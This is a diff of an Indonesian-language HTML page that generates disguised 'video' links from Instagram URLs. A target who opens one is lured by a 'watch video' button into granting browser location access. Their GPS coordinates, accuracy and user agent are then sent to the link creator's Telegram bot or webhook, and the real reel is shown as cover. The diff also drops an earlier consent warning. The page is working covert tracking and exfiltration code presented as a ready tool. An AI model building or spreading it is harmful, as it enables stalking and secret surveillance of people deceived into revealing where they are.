@@ -4,11 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Video Link</title>
-
-<!-- Leaflet untuk peta -->
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -22,7 +19,7 @@
     justify-content: center;
   }
 
-  /* ============ GENERATOR MODE ============ */
+  /* ============ GENERATOR ============ */
   .card {
     background: white;
     border-radius: 24px;
@@ -33,276 +30,263 @@
   }
   h1 { color: #262626; margin-bottom: 8px; font-size: 24px; }
   .sub { color: #8e8e8e; margin-bottom: 24px; font-size: 14px; }
-  label { display:block; font-size: 13px; font-weight:600; color:#262626; margin-bottom:6px; margin-top:14px; }
+  label {
+    display: block; font-size: 13px; font-weight: 600;
+    color: #262626; margin-bottom: 6px; margin-top: 14px;
+  }
   input, select {
-    width: 100%;
-    padding: 14px 18px;
-    border: 2px solid #dbdbdb;
-    border-radius: 12px;
-    font-size: 15px;
-    outline: none;
-    transition: 0.2s;
-    font-family: inherit;
+    width: 100%; padding: 14px 18px;
+    border: 2px solid #dbdbdb; border-radius: 12px;
+    font-size: 15px; outline: none;
+    transition: 0.2s; font-family: inherit;
   }
   input:focus, select:focus { border-color: #fd1d1d; }
-  button {
-    width: 100%;
-    padding: 14px;
+  .btn-main {
+    width: 100%; padding: 14px;
     background: linear-gradient(135deg, #833ab4, #fd1d1d);
-    color: white;
-    border: none;
-    border-radius: 12px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: 0.2s;
-    margin-top: 16px;
+    color: white; border: none; border-radius: 12px;
+    font-size: 16px; font-weight: 600; cursor: pointer;
+    transition: 0.2s; margin-top: 16px;
   }
-  button:hover { opacity: 0.9; transform: translateY(-1px); }
-  button:active { transform: translateY(0); }
-
+  .btn-main:hover { opacity: 0.9; }
   .result {
-    margin-top: 20px;
-    padding: 16px;
-    background: #fafafa;
-    border-radius: 12px;
+    margin-top: 20px; padding: 16px;
+    background: #fafafa; border-radius: 12px;
     display: none;
   }
   .result.show { display: block; }
-  .result-label { font-size: 12px; color: #8e8e8e; margin-bottom: 6px; font-weight:600; }
   .result-link {
-    font-family: monospace;
-    font-size: 13px;
-    word-break: break-all;
-    background: white;
-    padding: 12px;
-    border-radius: 8px;
-    border: 1px solid #dbdbdb;
-    margin-bottom: 10px;
+    font-family: monospace; font-size: 13px;
+    word-break: break-all; background: white;
+    padding: 12px; border-radius: 8px;
+    border: 1px solid #dbdbdb; margin-bottom: 10px;
   }
   .btn-row { display: flex; gap: 8px; }
-  .btn-row button { font-size: 14px; padding: 10px; margin-top:0; }
+  .btn-row button {
+    flex: 1; font-size: 14px; padding: 10px;
+    border: none; border-radius: 8px;
+    color: white; font-weight: 600; cursor: pointer;
+  }
   .btn-copy { background: #0095f6; }
-  .btn-open { background: #262626; }
-
+  .btn-test { background: #262626; }
   .note {
-    font-size: 12px;
-    color: #8e8e8e;
-    margin-top: 16px;
-    padding-top: 16px;
-    border-top: 1px solid #efefef;
-    line-height: 1.6;
+    font-size: 12px; color: #8e8e8e;
+    margin-top: 16px; padding-top: 16px;
+    border-top: 1px solid #efefef; line-height: 1.6;
   }
-
   .status-box {
-    background: #fff4e5;
-    border-left: 4px solid #fcb045;
-    padding: 12px 14px;
-    border-radius: 8px;
-    font-size: 13px;
-    color: #7a4a00;
-    margin-top: 14px;
+    background: #fff4e5; border-left: 4px solid #fcb045;
+    padding: 12px 14px; border-radius: 8px;
+    font-size: 13px; color: #7a4a00; margin-top: 14px;
   }
 
-  /* ============ TRACKING MODE ============ */
-  .tracking-body {
+  /* ============ TRACKING ============ */
+  #trackingView {
+    display: none;
+    position: fixed;
+    inset: 0;
     background: #000;
-    padding: 0;
-    display: block;
+    color: white;
+    overflow-y: auto;
+    z-index: 9999;
   }
-  .tracking-wrap {
+  .track-wrap {
     min-height: 100vh;
     display: flex;
     flex-direction: column;
     align-items: center;
     justify-content: center;
-    color: white;
     padding: 20px;
     text-align: center;
   }
   .spinner {
-    width: 60px; height: 60px;
+    width: 50px; height: 50px;
     border: 4px solid #333;
     border-top-color: #fd1d1d;
     border-radius: 50%;
     animation: spin 0.8s linear infinite;
-    margin: 0 auto 24px;
+    margin: 0 auto 20px;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
-  .track-title { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
-  .track-status { color: #aaa; font-size: 14px; margin-top: 10px; max-width: 320px; }
-  .vid-preview {
-    width: 100%;
-    max-width: 400px;
-    border-radius: 16px;
-    overflow: hidden;
-    margin-bottom: 24px;
-    background: #111;
-    aspect-ratio: 9/16;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #555;
-    font-size: 14px;
+  .track-title {
+    font-size: 18px; font-weight: 600;
+    margin-bottom: 8px; color: white;
+  }
+  .track-status {
+    color: #aaa; font-size: 14px;
+    max-width: 320px; margin: 0 auto;
   }
   .btn-allow {
     background: linear-gradient(135deg, #833ab4, #fd1d1d);
-    color: white;
-    border: none;
-    padding: 16px 40px;
-    border-radius: 50px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    margin-top: 20px;
-    width: auto;
-    max-width: 300px;
+    color: white; border: none;
+    padding: 16px 40px; border-radius: 50px;
+    font-size: 16px; font-weight: 600;
+    cursor: pointer; margin-top: 24px;
+    display: inline-block;
   }
-
+  .btn-allow:hover { opacity: 0.9; }
   #mapView {
-    height: 300px;
-    width: 100%;
-    max-width: 500px;
-    border-radius: 16px;
-    margin-top: 20px;
+    height: 260px; width: 100%; max-width: 480px;
+    border-radius: 16px; margin: 20px auto 0;
     display: none;
   }
-
-  .success-icon {
-    font-size: 60px;
-    margin-bottom: 16px;
+  .ig-embed-wrap {
+    width: 100%; max-width: 400px;
+    margin: 16px auto;
+    background: white;
+    border-radius: 12px;
+    overflow: hidden;
+  }
+  .ig-embed-wrap iframe {
+    width: 100%; height: 500px;
+    border: none; display: block;
   }
 </style>
 </head>
 <body>
 
-<!-- ================== GENERATOR MODE ================== -->
+<!-- ============ GENERATOR VIEW ============ -->
 <div class="card" id="generatorView">
   <h1>🎬 Video Link Generator</h1>
-  <p class="sub">Tempel link video Instagram, dapatkan link tracking lokasi</p>
+  <p class="sub">Tempel link Instagram, dapatkan link tracking lokasi</p>
 
-  <label>Link Instagram (Reel / Post / IGTV)</label>
+  <label>Link Instagram (Reel / Post)</label>
   <input type="text" id="igUrl" placeholder="https://www.instagram.com/reel/xxxxx/">
 
-  <label>URL Website Anda (hosting file ini)</label>
-  <input type="text" id="baseUrl" placeholder="https://situs-anda.netlify.app" value="">
+  <label>URL Website Anda</label>
+  <input type="text" id="baseUrl" placeholder="https://situs-anda.netlify.app">
 
-  <label>Endpoint Penerima Lokasi (opsional)</label>
+  <label>Endpoint Penerima Lokasi</label>
   <select id="endpointType">
-    <option value="webhook">Webhook.site (test)</option>
     <option value="telegram">Telegram Bot</option>
+    <option value="webhook">Webhook.site (test)</option>
     <option value="custom">Custom URL</option>
-    <option value="none">Tanpa Kirim (hanya tampil di peta)</option>
+    <option value="none">Tanpa Kirim (hanya log)</option>
   </select>
 
-  <div id="webhookFields">
-    <input type="text" id="webhookUrl" placeholder="https://webhook.site/xxxxx-xxxx" style="margin-top:10px;">
+  <div id="telegramFields">
+    <input type="text" id="botToken" placeholder="Bot Token (dari @BotFather)" style="margin-top:10px;">
+    <input type="text" id="chatId" placeholder="Chat ID (dari @userinfobot)" style="margin-top:10px;">
   </div>
 
-  <div id="telegramFields" style="display:none;">
-    <input type="text" id="botToken" placeholder="Bot Token (dari @BotFather)" style="margin-top:10px;">
-    <input type="text" id="chatId" placeholder="Chat ID Anda (dari @userinfobot)" style="margin-top:10px;">
+  <div id="webhookFields" style="display:none;">
+    <input type="text" id="webhookUrl" placeholder="https://webhook.site/xxxxx-xxxx" style="margin-top:10px;">
   </div>
 
   <div id="customFields" style="display:none;">
     <input type="text" id="customUrl" placeholder="https://api-anda.com/track" style="margin-top:10px;">
   </div>
 
-  <button onclick="generate()">🔗 Generate Tracking Link</button>
+  <button class="btn-main" onclick="generate()">🔗 Generate Tracking Link</button>
 
   <div class="result" id="result">
-    <div class="result-label">LINK TRACKING ANDA:</div>
     <div class="result-link" id="output"></div>
     <div class="btn-row">
       <button class="btn-copy" onclick="copyLink()">📋 Copy</button>
-      <button class="btn-open" onclick="testLink()">🧪 Test Sendiri</button>
+      <button class="btn-test" onclick="testLink()">🧪 Test Sendiri</button>
     </div>
   </div>
 
   <div class="status-box">
-    <strong>⚠️ Perhatian:</strong> Link ini hanya akan dapat lokasi <u>jika orang yang membuka mengizinkan akses lokasi</u> di browsernya. Tidak ada cara bypass izin ini di browser modern.
+    <strong>💡 Tips:</strong> Ambil link IG dari app → buka reel → titik 3 → <b>Copy Link</b>.
   </div>
 
   <div class="note">
-    <strong>Cara pakai:</strong><br>
-    1. Upload file HTML ini ke hosting (Netlify/Vercel/GitHub Pages).<br>
-    2. Isi URL hosting di kolom "URL Website Anda".<br>
-    3. Pilih endpoint penerima lokasi (Telegram paling praktis).<br>
-    4. Klik Generate → copy link → kirim ke target.<br>
-    5. Saat target buka, mereka akan diminta izin lokasi. Jika "Allow", koordinat masuk ke Anda, lalu otomatis redirect ke video Instagram.
+    <strong>Cara kerja:</strong> Target klik link → lihat tombol "Tonton Video" → klik → browser minta izin lokasi → lokasi terkirim ke Anda → video IG muncul.
   </div>
 </div>
 
-<!-- ================== TRACKING MODE ================== -->
-<div class="tracking-body" id="trackingView" style="display:none;">
-  <div class="tracking-wrap">
-    <div class="vid-preview" id="vidPreview">
-      <span>🎬 Memuat video...</span>
+<!-- ============ TRACKING VIEW ============ -->
+<div id="trackingView">
+  <div class="track-wrap">
+    <div id="stage1">
+      <div class="spinner"></div>
+      <div class="track-title">Memuat video...</div>
+      <div class="track-status" id="trackStatus">Mohon tunggu sebentar</div>
     </div>
-    <div class="spinner" id="spinner"></div>
-    <div class="track-title" id="trackTitle">Sedang memverifikasi...</div>
-    <div class="track-status" id="trackStatus">Mohon tunggu sebentar</div>
+
+    <div id="stage2" style="display:none; width:100%;">
+      <div class="track-title">✅ Video siap</div>
+      <div class="track-status">Silakan tonton video di bawah</div>
+      <div class="ig-embed-wrap" id="igEmbed"></div>
+      <div id="mapView"></div>
+    </div>
+
     <button class="btn-allow" id="allowBtn" style="display:none;" onclick="startTracking()">
       ▶️ Tonton Video
     </button>
-    <div id="mapView"></div>
   </div>
 </div>
 
 <script>
 /* ============================================================
-   UTILITY
+   HELPER: Base64 URL-safe encode/decode
    ============================================================ */
 function b64encode(str) {
-  return btoa(unescape(encodeURIComponent(str)))
-    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+  try {
+    return btoa(unescape(encodeURIComponent(str)))
+      .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+  } catch(e) { return ''; }
 }
+
 function b64decode(str) {
   try {
-    let s = str.replace(/-/g, '+').replace(/_/g, '/');
+    let s = String(str).replace(/-/g, '+').replace(/_/g, '/');
     while (s.length % 4) s += '=';
     return decodeURIComponent(escape(atob(s)));
   } catch(e) { return ''; }
 }
 
 /* ============================================================
-   ROUTER: cek apakah mode generator atau tracking
+   STATE
+   ============================================================ */
+const TS = {
+  igUrl: '',
+  token: '',
+  endpoint: { type: 'none' },
+  map: null,
+  marker: null
+};
+
+/* ============================================================
+   ROUTER: deteksi mode
    ============================================================ */
 (function router() {
-  const params = new URLSearchParams(location.search);
+  const params = new URLSearchParams(window.location.search);
+  const r = params.get('r');
+  const t = params.get('t');
 
-  if (params.get('r') && params.get('t')) {
-    // === MODE TRACKING ===
+  if (r && t) {
+    // MODE TRACKING
     document.getElementById('generatorView').style.display = 'none';
     document.getElementById('trackingView').style.display = 'block';
-    document.body.classList.add('tracking-body');
     document.body.style.background = '#000';
     document.body.style.padding = '0';
     document.body.style.display = 'block';
+    document.body.style.alignItems = 'initial';
+    document.body.style.justifyContent = 'initial';
 
-    initTracking(params.get('r'), params.get('t'), params.get('e'));
+    initTracking(r, t, params.get('e'));
   } else {
-    // === MODE GENERATOR ===
-    document.getElementById('generatorView').style.display = 'block';
-    document.getElementById('trackingView').style.display = 'none';
-
-    // auto-isi base URL dari lokasi saat ini
+    // MODE GENERATOR
     const baseInput = document.getElementById('baseUrl');
     if (!baseInput.value) {
-      baseInput.value = location.origin + location.pathname.replace(/\/[^/]*$/, '');
+      const origin = window.location.origin;
+      const path = window.location.pathname.replace(/\/[^/]*$/, '');
+      baseInput.value = (origin === 'null' ? '' : origin) + path;
     }
 
-    // toggle fields sesuai endpoint
+    // Toggle fields sesuai endpoint
     document.getElementById('endpointType').addEventListener('change', function() {
-      document.getElementById('webhookFields').style.display = this.value === 'webhook' ? 'block' : 'none';
       document.getElementById('telegramFields').style.display = this.value === 'telegram' ? 'block' : 'none';
+      document.getElementById('webhookFields').style.display = this.value === 'webhook' ? 'block' : 'none';
       document.getElementById('customFields').style.display = this.value === 'custom' ? 'block' : 'none';
     });
   }
 })();
 
 /* ============================================================
-   GENERATOR
+   GENERATOR FUNCTIONS
    ============================================================ */
 function generate() {
   const igUrl = document.getElementById('igUrl').value.trim();
@@ -313,30 +297,28 @@ function generate() {
   if (!igUrl.includes('instagram.com')) { alert('Link harus dari Instagram!'); return; }
   if (!baseUrl) { alert('Masukkan URL website Anda!'); return; }
 
-  // Build endpoint config
-  let epConfig = null;
-  if (epType === 'webhook') {
-    const u = document.getElementById('webhookUrl').value.trim();
-    if (!u) { alert('Isi URL webhook.site dulu!'); return; }
-    epConfig = { type: 'webhook', url: u };
-  } else if (epType === 'telegram') {
-    const t = document.getElementById('botToken').value.trim();
-    const c = document.getElementById('chatId').value.trim();
-    if (!t || !c) { alert('Isi Bot Token dan Chat ID dulu!'); return; }
-    epConfig = { type: 'telegram', token: t, chat: c };
+  let endpoint = { type: 'none' };
+
+  if (epType === 'telegram') {
+    const token = document.getElementById('botToken').value.trim();
+    const chat = document.getElementById('chatId').value.trim();
+    if (!token || !chat) { alert('Isi Bot Token dan Chat ID!'); return; }
+    endpoint = { type: 'telegram', token: token, chat: chat };
+  } else if (epType === 'webhook') {
+    const url = document.getElementById('webhookUrl').value.trim();
+    if (!url) { alert('Isi URL webhook!'); return; }
+    endpoint = { type: 'webhook', url: url };
   } else if (epType === 'custom') {
-    const u = document.getElementById('customUrl').value.trim();
-    if (!u) { alert('Isi URL custom dulu!'); return; }
-    epConfig = { type: 'custom', url: u };
-  } else {
-    epConfig = { type: 'none' };
+    const url = document.getElementById('customUrl').value.trim();
+    if (!url) { alert('Isi URL custom!'); return; }
+    endpoint = { type: 'custom', url: url };
   }
 
   const token = Math.random().toString(36).slice(2, 12);
   const encodedIg = b64encode(igUrl);
-  const encodedEp = epConfig ? b64encode(JSON.stringify(epConfig)) : '';
+  const encodedEp = b64encode(JSON.stringify(endpoint));
 
-  const trackUrl = `${baseUrl}/?r=${encodedIg}&t=${token}&e=${encodedEp}`;
+  const trackUrl = baseUrl + '/?r=' + encodedIg + '&t=' + token + '&e=' + encodedEp;
 
   document.getElementById('output').textContent = trackUrl;
   document.getElementById('result').classList.add('show');
@@ -345,12 +327,13 @@ function generate() {
 
 function copyLink() {
   if (!window._trackUrl) return;
-  navigator.clipboard.writeText(window._trackUrl).then(() => {
+  navigator.clipboard.writeText(window._trackUrl).then(function() {
     alert('✅ Link berhasil di-copy!');
-  }).catch(() => {
+  }).catch(function() {
     const ta = document.createElement('textarea');
     ta.value = window._trackUrl;
-    document.body.appendChild(ta); ta.select();
+    document.body.appendChild(ta);
+    ta.select();
     document.execCommand('copy');
     document.body.removeChild(ta);
     alert('✅ Link berhasil di-copy!');
@@ -363,157 +346,186 @@ function testLink() {
 }
 
 /* ============================================================
-   TRACKING MODE
+   TRACKING FUNCTIONS
    ============================================================ */
-let trackState = {
-  igUrl: '',
-  token: '',
-  epConfig: null,
-  map: null,
-  marker: null,
-};
-
 function initTracking(encodedR, token, encodedEp) {
-  trackState.igUrl = b64decode(encodedR);
-  trackState.token = token;
-  trackState.epConfig = encodedEp ? JSON.parse(b64decode(encodedEp)) : { type: 'none' };
+  TS.igUrl = b64decode(encodedR);
+  TS.token = token;
 
-  const trackTitle = document.getElementById('trackTitle');
-  const trackStatus = document.getElementById('trackStatus');
-  const allowBtn = document.getElementById('allowBtn');
-  const spinner = document.getElementById('spinner');
-  const vidPreview = document.getElementById('vidPreview');
+  try {
+    TS.endpoint = encodedEp ? JSON.parse(b64decode(encodedEp)) : { type: 'none' };
+  } catch (e) {
+    TS.endpoint = { type: 'none' };
+  }
 
-  trackTitle.textContent = 'Video siap diputar';
-  trackStatus.textContent = 'Klik tombol di bawah untuk menonton';
-  spinner.style.display = 'none';
+  // Tampilkan tombol setelah delay singkat
+  setTimeout(function() {
+    document.getElementById('trackStatus').textContent = 'Klik tombol di bawah untuk menonton';
+    document.querySelector('#stage1 .spinner').style.display = 'none';
+    document.getElementById('allowBtn').style.display = 'inline-block';
+  }, 900);
+}
 
-  // tampilkan tombol setelah 1 detik
-  setTimeout(() => {
-    allowBtn.style.display = 'inline-block';
-  }, 800);
-
-  // pasang tampilan preview video IG (thumbnail via iframe tidak bisa, jadi placeholder)
-  vidPreview.innerHTML = `
-    <div style="text-align:center; padding: 20px;">
-      <div style="font-size: 80px; margin-bottom: 16px;">▶️</div>
-      <div style="font-size: 14px; color: #888;">Video Instagram siap dibuka</div>
-    </div>
-  `;
+function extractIgInfo(url) {
+  if (!url) return null;
+  const match = url.match(/\/(reel|p|tv)\/([A-Za-z0-9_-]+)/);
+  if (!match) return null;
+  return { type: match[1], id: match[2] };
 }
 
 function startTracking() {
   const allowBtn = document.getElementById('allowBtn');
+  const stage1 = document.getElementById('stage1');
   const trackStatus = document.getElementById('trackStatus');
-  const trackTitle = document.getElementById('trackTitle');
-  const spinner = document.getElementById('spinner');
-  const mapView = document.getElementById('mapView');
 
   allowBtn.style.display = 'none';
-  spinner.style.display = 'block';
-  trackTitle.textContent = 'Memverifikasi...';
-  trackStatus.textContent = 'Menunggu izin lokasi dari browser';
+  stage1.style.display = 'block';
+  document.querySelector('#stage1 .spinner').style.display = 'block';
+  trackStatus.textContent = 'Menunggu izin lokasi...';
 
   if (!navigator.geolocation) {
-    trackStatus.textContent = 'Browser tidak mendukung GPS. Mengalihkan...';
-    setTimeout(redirectToIg, 1000);
+    trackStatus.textContent = 'Browser tidak support GPS';
+    setTimeout(showVideo, 1000);
     return;
   }
 
   navigator.geolocation.getCurrentPosition(
-    async (pos) => {
+    function(pos) {
       const lat = pos.coords.latitude;
       const lng = pos.coords.longitude;
       const acc = pos.coords.accuracy;
 
-      // tampilkan peta
-      spinner.style.display = 'none';
-      trackTitle.textContent = '✅ Verifikasi berhasil';
-      trackStatus.textContent = `Lokasi Anda terdeteksi. Mengalihkan ke video...`;
+      sendLocation(lat, lng, acc);
 
-      // tampilkan peta lokasi user
-      mapView.style.display = 'block';
-      if (!trackState.map) {
-        trackState.map = L.map('mapView').setView([lat, lng], 15);
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
-          attribution: '© OpenStreetMap'
-        }).addTo(trackState.map);
-        trackState.marker = L.marker([lat, lng]).addTo(trackState.map)
-          .bindPopup('📍 Lokasi Anda').openPopup();
-      } else {
-        trackState.map.setView([lat, lng], 15);
-        trackState.marker.setLatLng([lat, lng]);
-      }
-
-      // kirim ke endpoint
-      await sendLocation(lat, lng, acc);
-
-      // redirect ke IG
-      setTimeout(redirectToIg, 1800);
+      trackStatus.textContent = '✅ Lokasi terdeteksi';
+      setTimeout(function() {
+        showVideo();
+        showMap(lat, lng);
+      }, 600);
     },
-    (err) => {
+    function(err) {
       console.log('GPS error:', err);
-      spinner.style.display = 'none';
-      trackTitle.textContent = '⚠️ Lokasi tidak diizinkan';
-      trackStatus.textContent = 'Mengalihkan ke video...';
-      setTimeout(redirectToIg, 1200);
+      trackStatus.textContent = 'Lokasi tidak diizinkan';
+      setTimeout(showVideo, 800);
     },
     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
   );
 }
 
-async function sendLocation(lat, lng, acc) {
-  const ep = trackState.epConfig;
+function sendLocation(lat, lng, acc) {
+  const ep = TS.endpoint;
   if (!ep || ep.type === 'none') {
-    console.log('📍 Lokasi user:', lat, lng, 'acc:', acc);
+    console.log('📍 Lokasi user:', lat, lng, 'akurasi:', acc);
     return;
   }
 
-  const mapsLink = `https://maps.google.com/?q=${lat},${lng}`;
-  const infoText =
-    `📍 *Lokasi Baru Terdeteksi*\n\n` +
-    `🌐 Lat: ${lat.toFixed(6)}\n` +
-    `🌐 Lng: ${lng.toFixed(6)}\n` +
-    `🎯 Akurasi: ${Math.round(acc)} m\n` +
-    `🗺️ Maps: ${mapsLink}\n` +
-    `🕐 ${new Date().toLocaleString('id-ID')}\n` +
-    `🆔 Token: ${trackState.token}\n` +
-    `📱 UA: ${navigator.userAgent.substring(0, 100)}`;
+  const mapsLink = 'https://maps.google.com/?q=' + lat + ',' + lng;
+  const text =
+    '📍 *Lokasi Terdeteksi*\n\n' +
+    '🌐 Lat: ' + lat.toFixed(6) + '\n' +
+    '🌐 Lng: ' + lng.toFixed(6) + '\n' +
+    '🎯 Akurasi: ' + Math.round(acc) + ' m\n' +
+    '🗺️ ' + mapsLink + '\n' +
+    '🕐 ' + new Date().toLocaleString('id-ID') + '\n' +
+    '🆔 Token: ' + TS.token;
 
   try {
-    if (ep.type === 'webhook' || ep.type === 'custom') {
-      await fetch(ep.url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          lat, lng, acc,
-          token: trackState.token,
-          time: new Date().toISOString(),
-          ua: navigator.userAgent,
-          maps: mapsLink
-        })
-      });
-    } else if (ep.type === 'telegram') {
-      await fetch(`https://api.telegram.org/bot${ep.token}/sendMessage`, {
+    if (ep.type === 'telegram') {
+      fetch('https://api.telegram.org/bot' + ep.token + '/sendMessage', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: ep.chat,
-          text: infoText,
+          text: text,
           parse_mode: 'Markdown'
         })
-      });
+      }).catch(function(e) { console.error('Telegram error:', e); });
+
+    } else if (ep.type === 'webhook' || ep.type === 'custom') {
+      fetch(ep.url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          lat: lat,
+          lng: lng,
+          acc: acc,
+          token: TS.token,
+          maps: mapsLink,
+          time: new Date().toISOString(),
+          ua: navigator.userAgent
+        })
+      }).catch(function(e) { console.error('Webhook error:', e); });
     }
   } catch (e) {
-    console.error('Gagal kirim lokasi:', e);
+    console.error('Send location error:', e);
   }
 }
 
-function redirectToIg() {
-  const url = trackState.igUrl || 'https://instagram.com';
-  window.location.href = url;
+function showVideo() {
+  document.getElementById('stage1').style.display = 'none';
+  document.getElementById('stage2').style.display = 'block';
+  renderIgEmbed();
+}
+
+function renderIgEmbed() {
+  const wrap = document.getElementById('igEmbed');
+  const info = extractIgInfo(TS.igUrl);
+
+  if (!info) {
+    wrap.innerHTML =
+      '<div style="padding:40px;color:#666;text-align:center;">' +
+        'Link IG tidak valid<br><br>' +
+        '<a href="' + TS.igUrl + '" style="color:#0095f6;text-decoration:none;">' +
+          'Buka di Instagram →' +
+        '</a>' +
+      '</div>';
+    return;
+  }
+
+  const embedUrl = 'https://www.instagram.com/' + info.type + '/' + info.id + '/embed/';
+
+  wrap.innerHTML =
+    '<iframe src="' + embedUrl + '" ' +
+    'allowtransparency="true" ' +
+    'allowfullscreen="true" ' +
+    'scrolling="no" ' +
+    'frameborder="0"></iframe>';
+}
+
+function showMap(lat, lng) {
+  const mapEl = document.getElementById('mapView');
+  mapEl.style.display = 'block';
+
+  setTimeout(function() {
+    try {
+      if (!TS.map) {
+        TS.map = L.map('mapView', { zoomControl: true }).setView([lat, lng], 15);
+
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
+          attribution: '© OpenStreetMap',
+          subdomains: 'abcd',
+          maxZoom: 19
+        }).addTo(TS.map);
+
+        TS.marker = L.marker([lat, lng]).addTo(TS.map);
+        TS.marker.bindPopup('📍 Lokasi Anda').openPopup();
+      } else {
+        TS.map.setView([lat, lng], 15);
+        TS.marker.setLatLng([lat, lng]);
+      }
+
+      setTimeout(function() {
+        if (TS.map) TS.map.invalidateSize();
+      }, 200);
+    } catch (e) {
+      console.error('Map error:', e);
+    }
+  }, 150);
 }
 </script>
+
+</body>
+</html>
 
 </body>
 </html>
